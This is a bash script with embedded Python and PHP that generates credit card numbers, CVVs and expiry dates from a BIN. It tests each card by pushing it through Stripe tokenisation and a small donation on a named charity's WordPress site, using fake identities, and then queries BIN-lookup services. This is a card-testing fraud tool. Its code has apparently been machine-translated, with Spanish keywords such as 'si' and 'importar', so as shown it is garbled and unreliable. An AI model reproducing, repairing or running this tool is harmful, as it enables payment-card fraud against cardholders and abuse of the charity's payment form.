#! / bin / bash
# GERA CC PYTHON
install_fun () {
    # PreInstalando
    apt-get update
    apt-get install apache2 -y
    apt-get install cron curl unzip -y
    apt-get install php5-curl -y
    apt-get install php5 libapache2-mod-php5 php5-mcrypt -y
    apt-get install libssh2-1-dev libssh2-php -y
    reiniciar el servicio apache2
    # Instalando PHP 7.2
    sudo add-apt-repository -y ppa: ondrej / php && sudo apt-get update
    apt-get install python -y
    apt-get install python-pip -y
    sudo apt-get install -y php7.2 libapache2-mod-php7.2 php7.2-curl php7.2-gd php7.2-mbstring php7.2-cli php-memcached php7.2-mysql php7.2-xml php7.2-xmlrpc php7.2-sqlite3 php7.2-json php7.2-zip
    # Configura  es hacer PHP
    # sed -i "s @ ^ memory_limit. * @ memory_limit = 512M @" /etc/php/7.2/apache2/php.ini
    # sed -i 's @ ^ output_buffering = @ output_buffering = On \ noutput_buffering = @' /etc/php/7.2/apache2/php.ini
    sed -i 's @ ^; cgi.fix_pathinfo. * @ cgi.fix_pathinfo = 0 @' /etc/php/7.2/apache2/php.ini
    # sed -i 's @ ^ short_open_tag = Off @ short_open_tag = On @' /etc/php/7.2/apache2/php.ini
    # sed -i 's @ ^ expose_php = On @ expose_php = Off @' /etc/php/7.2/apache2/php.ini
    # sed -i 's @ ^ request_order. * @ request_order = "CGP" @' /etc/php/7.2/apache2/php.ini
    sed -i 's @ ^; date.timezone.*@date.timezone = America / Sao_Paulo @' /etc/php/7.2/apache2/php.ini
    sed -i 's @ ^ post_max_size. * @ post_max_size = 100M @' /etc/php/7.2/apache2/php.ini
    sed -i 's @ ^ upload_max_filesize. * @ upload_max_filesize = 100M @' /etc/php/7.2/apache2/php.ini
    sed -i 's @ ^ max_execution_time. * @ max_execution_time = 600 @' /etc/php/7.2/apache2/php.ini
    # sed -i 's @ ^; tamaño_caché_caché_realpath.*@size_cache_ruta_real = 2M @' /etc/php/7.2/apache2/php.ini
    # sed -i 's @ ^ disable_functions. * @ disable_functions = passthru, exec, system, chroot, chgrp, chown, shell_exec, proc_open, proc_get_status, ini_alter, ini_restore, dl, openlog, syscketlog, readlink, symlink, stream_exec, popepassocketlog fsocket, popen @ '/etc/php/7.2/apache2/php.ini
    # [-ne / usr / sbin / sendmail] && sed -i 's @ ^; sendmail_path.*@sendmail_path = / usr / sbin / sendmail -t -i @' /etc/php/7.2/apache2/php.ini
    # sed -i "s @ ^; curl.cainfo.*@curl.cainfo = $ {openssl_install_dir} /cert.pem@" /etc/php/7.2/apache2/php.ini
    # sed -i "s @ ^; openssl.cafile.*@openssl.cafile = $ {openssl_install_dir} /cert.pem@" /etc/php/7.2/apache2/php.ini
}
gerar_cc_fun () {
si [[-e / usr / bin / python]]; entonces
PY = "/ usr / bin / python"
elif [[-e / bin / python]]; entonces
PY = "/ bin / python"
más
install_fun
salida 1
fi
$ PY -x << PITÓN
importar getopt
tiempo de importación
importar sistema operativo 
importar sys
importar fecha y hora
de randint de importación aleatoria
versión = "1.0.0"
def parseOptions ():
    bin_format = ""
    saveopt = Falso
    límite = 10
    ccv = Falso
    fecha = Falso
    check = Falso

    tratar:
        argv = "$ @". split ()
        opts, args = getopt.getopt (argv, "h: b: u: gcd", ["ayuda", "bin", "guardar", "cantidad", "ccv", "fecha"])
        para optar, arg en opta:
            si opta por ("-h"):
                sys.exit ()
            elif opt in ("-b", "-bin"):
                bin_format = arg
            elif opt in ("-g", "-guardar"):
                saveopt = Verdadero
            elif opt in ("-u", "-cantidad"):
                límite = arg
            elif opt in ("-c", "-ccv"):
                ccv = Verdadero
            elif opt in ("-d", "-date"):
                fecha = Verdadero

        return (bin_format, saveopt, límite, ccv, fecha)

    excepto getopt.GetoptError:        
        sys.exit (2)

def cardLuhnChecksumIsValid (card_number):
    "" "comprueba para asegurarse de que la tarjeta pase una suma de comprobación luhn mod-10" ""

    suma = 0
    num_digits = len (card_number)
    oddeven = num_digits & 1

    para contar en rango (0, num_digits):
        digit = int (card_number [count])

        si no ((count & 1) ^ oddeven):
            dígito = dígito * 2
        si dígito> 9:
            dígito = dígito - 9

        suma = suma + dígito

    return ((suma% 10) == 0)

def ccgen (bin_format):
    out_cc = ""
    si len (bin_format) == 16:        
        para i en el rango (15):
            si bin_format [i] en ("0", "1", "2", "3", "4", "5", "6", "7", "8", "9"):
                out_cc = out_cc + bin_format [i]
                Seguir
            elif bin_format [i] en ("x"):
                out_cc = out_cc + str (randint (0,9))
            más:
                print ("\ ERROR: {} \ n" .format (bin_format))
                print ("ERROR: bin 16 dígitos \ n")
                sys.exit ()

        para i en el rango (10):
            checksum_check = out_cc
            suma_de_comprobación = verificación_ suma_de_comprobación + str (i)

            if cardLuhnChecksumIsValid (checksum_check):
                out_cc = checksum_check
                descanso
            más:
                checksum_check = out_cc

    más:
        imprimir ("\ 033 [1; 32m")
        print ("ERROR: bin 16 dígitos \ n")
        sys.exit ()

    volver (out_cc)

def guardar (generado):
    ahora = datetime.datetime.now ()
    file_name = "cc-gen_output_ {0} .txt" .format (str (ahora.día) + str (ahora.hora) + str (ahora.minuto) + str (ahora.segundo))
    f = open (nombre_archivo, 'w')
    para la entrada de línea generada:
        f.write (línea + "\ n")
    f. cerrar

def ccvgen ():
    ccv = ""
    num = randint (10,999)

    si num <100:
        ccv = "0" + str (num)
    más:
        ccv = str (num)

    volver (ccv)

def dategen ():
    ahora = datetime.datetime.now ()
    fecha = ""
    mes = str (randint (1, 12))
    año_actual = str (año actual)
    año = str (randint (int (año_actual [-2:]) + 1, int (año_actual [-2:]) + 6))
    fecha = mes + "|" + año

    Fecha de regreso

def main ():
    bin_list = []
    (bin_format, saveopt, límite, ccv, fecha) = parseOptions ()
    si bin_format no es "":
        para i en el rango (int (límite)):
            si ccv y fecha:
                bin_list.append (ccgen (bin_format) + "|" + ccvgen () + "|" + dategen ())
                imprimir (bin_list [i])
            elif ccv y no fecha:
                bin_list.append (ccgen (bin_format) + "|" + ccvgen ())
                imprimir (bin_list [i])
            fecha elif y no ccv:
                bin_list.append (ccgen (bin_format) + "|" + dategen ())
                imprimir (bin_list [i])
            elif no fecha y no ccv:
                bin_list.append (ccgen (bin_format))
                imprimir (bin_list [i])

        si no es bin_list:
            print ("\ nERROR: no valido bin \ n")            
        si saveopt:
            guardar (bin_list)
    más:        
        sys.exit ()

if __name__ == '__main__':
    principal()
PITÓN
}
# TESTA CC / PHP
php_fun () {
si [[-e / usr / bin / php]]; entonces
cierto
elif [[-e / bin / php]]; entonces
cierto
más
install_fun
salida 1
fi
gato << PHP
set_time_limit (0);
error_reporting (0);
date_default_timezone_set ('América / Sao_Paulo');

función GetStr (\ $ cadena, \ $ inicio, \ $ final)
{
    \ $ str = explotar (\ $ inicio, \ $ cadena);
    \ $ str = explotar (\ $ end, \ $ str [1]);
    return \ $ str [0];
}
\ $ cc = $ 1;
\ $ mes = $ 2;
\ $ ano = $ 3;
\ $ cvv = $ 4;
valor de la función (\ $ str, \ $ find_start, \ $ find_end) {
\ $ inicio = @strpos (\ $ str, \ $ find_start);
si (\ $ inicio === falso) {
regreso "";
}
\ $ longitud = strlen (\ $ find_start);
\ $ end = strpos (substr (\ $ str, \ $ start + \ $ length), \ $ find_end);
return trim (substr (\ $ str, \ $ start + \ $ length, \ $ end));
}
function mod (\ $ dividendo, \ $ divisor) {
return round (\ $ dividendo - (piso (\ $ dividendo / \ $ divisor) * \ $ divisor));
}
function cpf (\ $ compontos) {
\ $ n1 = rand (0,9);
\ $ n2 = rand (0,9);
\ $ n3 = rand (0,9);
\ $ n4 = rand (0,9);
\ $ n5 = rand (0,9);
\ $ n6 = rand (0,9);
\ $ n7 = rand (0,9);
\ $ n8 = rand (0,9);
\ $ n9 = rand (0,9);
\ $ d1 = \ $ n9 * 2 + \ $ n8 * 3 + \ $ n7 * 4 + \ $ n6 * 5 + \ $ n5 * 6 + \ $ n4 * 7 + \ $ n3 * 8 + \ $ n2 * 9 + \ $ n1 * 10;
\ $ d1 = 11 - (mod (\ $ d1,11));
si (\ $ d1> = 10) {\ $ d1 = 0;}
\ $ d2 = \ $ d1 * 2 + \ $ n9 * 3 + \ $ n8 * 4 + \ $ n7 * 5 + \ $ n6 * 6 + \ $ n5 * 7 + \ $ n4 * 8 + \ $ n3 * 9 + \ $ n2 * 10 + \ $ n1 * 11;
\ $ d2 = 11 - (mod (\ $ d2,11));
si (\ $ d2> = 10) {\ $ d2 = 0;}
\ $ retorno = '';
if (\ $ compontos == 1) {\ $ retorno = ''. \ $ n1. \ $ n2. \ $ n3. \ $ n4. \ $ n5. \ $ n6. \ $ n7. \ $ n8. \ $ n9. \ $ d1. \ $ d2;}
return \ $ retorno;
}
function dadosnome () {
	\ $ nome = archivo ("lista_nomes.txt");
    \ $ mynome = rand (0, tamaño de (\ $ nome) -1);
    \ $ nome = \ $ nome [\ $ mynome];
	return \ $ nome;
}
function dadossobre () {
	\ $ sobrenome = archivo ("lista_sobrenomes.txt");
    \ $ mysobrenome = rand (0, tamaño de (\ $ sobrenome) -1);
    \ $ sobrenome = \ $ sobrenome [\ $ mysobrenome];
	return \ $ sobrenome;
}
function email (\ $ nome) {
	\ $ email = preg_replace ('<\ W +>', "", \ $ nome) .rand (0000,9999). "@ hotmail.com";
	return \ $ email;
}
\ $ cpf = cpf (1);
\ $ nome = dadosnome ();
\ $ sobrenome = dadossobre ();
\ $ email = email (\ $ nome);
\ $ _ SERVER ['HTTP_USER_AGENT'] = 'Mozilla / 5.0 (Windows NT 6.2; WOW64; rv: 52.0) Gecko / 20100101 Firefox / 52.0';
\ $ ch = curl_init ();
curl_setopt (\ $ ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt (\ $ ch, CURLOPT_HEADER, 0);
curl_setopt (\ $ ch, CURLOPT_USERAGENT, \ $ _ SERVER ['HTTP_USER_AGENT']);
curl_setopt (\ $ ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt (\ $ ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt (\ $ ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt (\ $ ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt (\ $ ch, CURLOPT_COOKIEFILE, getcwd (). '/ cookie.txt');
curl_setopt (\ $ ch, CURLOPT_COOKIEJAR, getcwd (). '/ cookie.txt');
curl_setopt (\ $ ch, CURLOPT_HTTPHEADER, array ('Host: api.stripe.com',
'Agente de usuario: Mozilla / 5.0 (Windows NT 6.2; WOW64; rv: 52.0) Gecko / 20100101 Firefox / 52.0',
'Aceptar: aplicación / json',
'Content-Type: application / x-www-form-urlencoded',
'Referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fwww.thelambcenter.org&stripe_xdm_c=default816925&stripe_xdm_p=1',
'Conexión: mantener vivo'));
curl_setopt (\ $ ch, CURLOPT_POSTFIELDS, 'time_on_page = 533863 y pasted_fields = número y GUID = 9c0b4f09-af1e-4846-896d-ff0c8290b579 y muid = 4a6fc0a9-d552-4e49-9689-e8ddbd2ebd9a y sid = a69b7f1c-7f1b-47cd-8960-41b7aa981889 & key = pk_live_RyjDopRG8UNId1fsx3KyDY0l y payment_user_agent = stripe.js % 2F604c5e8 & card [name] = '. \ $ Nome.' + '. \ $ Sobrenome.' & Card [number] = '. \ $ Cc.' & Card [cvc] = '. \ $ Cvv.' & Card [exp_month] = '. \ $ mes.' & card [exp_year] = '. \ $ ano.' & card [address_line1] = Street + 435 & card [address_line2] = & card [address_city] = New + York & card [address_state] = NM & card [address_country] = US & card [ dirección_zip] = 10001 ');
\ $ pagamento = curl_exec (\ $ ch);
\ $ invalidvar = str_replace ("", "", \ $ pagamento);
\ $ invalidvar = str_replace ("\ n", "", \ $ invalidvar);
\ $ ccinvalid = trim (strip_tags (getstr (\ $ invalidvar, '"error": {"código": "', '"')));
if (\ $ ccinvalid == 'numero_incorrecto') {
Salida;
}
\ $ token = trim (strip_tags (getstr (\ $ pagamento, 'id ":"', '"')));
\ $ ch = curl_init ();
curl_setopt (\ $ ch, CURLOPT_URL, 'https://www.thelambcenter.org/wp-admin/admin-ajax.php');
curl_setopt (\ $ ch, CURLOPT_HEADER, 0);
curl_setopt (\ $ ch, CURLOPT_USERAGENT, \ $ _ SERVER ['HTTP_USER_AGENT']);
curl_setopt (\ $ ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt (\ $ ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt (\ $ ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt (\ $ ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt (\ $ ch, CURLOPT_COOKIEFILE, getcwd (). '/ cookie.txt');
curl_setopt (\ $ ch, CURLOPT_COOKIEJAR, getcwd (). '/ cookie.txt');
curl_setopt (\ $ ch, CURLOPT_POSTFIELDS, 'pubkey = pk_live_RyjDopRG8UNId1fsx3KyDY0l & siteUrl = https% 3A% 2F% 2Fwww.thelambcenter.org & tokenX = de8bf87112 & description = % 2F & diglabs-payment-form-id = b74c0fd1c02a6c10b25aba2b337f79d8 & amount-option = 0 & amountShown = 1.00 & fname = '. \ $ Nome.' & Lname = '. \ $ Sobrenome.' & Email = '. \ $ Email.' & Address &1 = Calle + 435 = Nueva + York & state = NM & country = US & zip = 10001 & phone = & honor-of = & token = '. \ $ Token.' & Action = stripe_plugin_process_card ');
\ $ pagamento = curl_exec (\ $ ch);
\ $ cbin = substr (\ $ cc, 0,1);
si (\ $ cbin == "5") {
\ $ cbin = "fa fa-cc-mastercard";
} más si (\ $ cbin == "4") {
\ $ cbin = "fa fa-cc-visa";
} más si (\ $ cbin == "3") {
\ $ cbin = "fa fa-cc-amex";
}
\ $ valores = matriz ('R \ $ 1,00', 'R \ $ 5,00', 'R \ $ 1,40', 'R \ $ 4,80', 'R \ $ 2,00' , 'R \ $ 7,00', 'R \ $ 10,00', 'R \ $ 3,00', 'R \ $ 3,40', 'R \ $ 5,50');
\ $ debitouu = \ $ valores [mt_rand (0,9)];
 \ $ bin = substr (\ $ cc, 0,6);
 \ $ binn = substr (\ $ cc, 0,6);
 \ $ ch = curl_init ();
 curl_setopt (\ $ ch, CURLOPT_URL, 'https://www.cardbinlist.com/search.html?bin='.\$bin);
 curl_setopt (\ $ ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt (\ $ ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt (\ $ ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt (\ $ ch, CURLOPT_SSL_VERIFYHOST, 0);
 \ $ bin = curl_exec (\ $ ch); 
 \ $ level = trim (strip_tags (getstr (\ $ bin, 'Tarjeta Sub Marca </th>', '</td>')));
 curl_close (\ $ ch);
 \ $ ch = curl_init ();
 curl_setopt (\ $ ch, CURLOPT_URL, 'https://lookup.binlist.net/'.\$binn);
 curl_setopt (\ $ ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt (\ $ ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt (\ $ ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt (\ $ ch, CURLOPT_SSL_VERIFYHOST, 0);
 \ $ bin = curl_exec (\ $ ch);
 curl_close (\ $ ch); 
\ $ datos = fecha ("d / m / YH: i: s");
\ $ pais = trim (strip_tags (getstr (\ $ bin, 'country ": {" alpha2 ":"', '"')));
\ $ banco = trim (strip_tags (getstr (\ $ bin, '"banco": {"nombre": "', '"')));
\ $ brand = trim (strip_tags (getstr (\ $ bin, '"esquema": "', '"')));
\ $ fone = trim (strip_tags (getstr (\ $ bin, '"teléfono": "', '"')));
\ $ tipo = trim (strip_tags (getstr (\ $ bin, '}, "type": "', '"')));
if (\ $ data! = "") {echo "Consulta: \ $ data \ n";}
if (\ $ nivel! = "") {echo "Nivel: \ $ nivel \ n";}
if (\ $ pais! = "") {echo "Pais: \ $ pais \ n";}
if (\ $ brand! = "") {echo "bandera: \ $ brand \ n";}
if (\ $ fone! = "") {echo "telefono: \ $ fone \ n";}
if (\ $ tipo! = "") {echo "Tipo: \ $ tipo \ n";}
PHP
}
echo -ne "Escriba el bin:" && leer UsrBin
while [[$ {# UsrBin} -lt 16]]; hacer UsrBin + = "x"; hecho
echo -ne "Cuantas Bin quiere Generar:" && leer GerBin
[[$ GerBin! = + ([0-9])]] && GerBin = 10
[[-z $ GerBin]] && GerBin = 10
BINS = $ (gerar_cc_fun -b $ {UsrBin} -u $ {GerBin} -d -c)
echo -e "=============================="
 para bins en $ (echo $ BINS); hacer
 cc = $ (echo $ bins | cut -d '|' -f1)
 mes = $ (echo $ bins | cut -d '|' -f3)
 [[$ {# mes} = "1"]] && mes = "0 $ {mes}"
 ano = $ (echo $ bins | cut -d '|' -f4)
 ano = "20 $ {ano}"
 cvv = $ (echo $ bins | cut -d '|' -f2)
 BIN = $ (php -r "$ (php_fun $ cc $ mes $ ano $ cvv)" 2> / dev / null)
 si [[-z $ BIN]]; entonces
 echo -e "BIN: $ cc INVALIDA"
 echo -e "=============================="
 más
 echo "BIN Encontrado!"
 echo "BIN: $ cc $ mes $ ano $ cvv"
 echo "$ BIN"
 echo -e "=============================="
 fi
 hecho
 [[-e ./cookie.txt]] && rm ./cookie.txt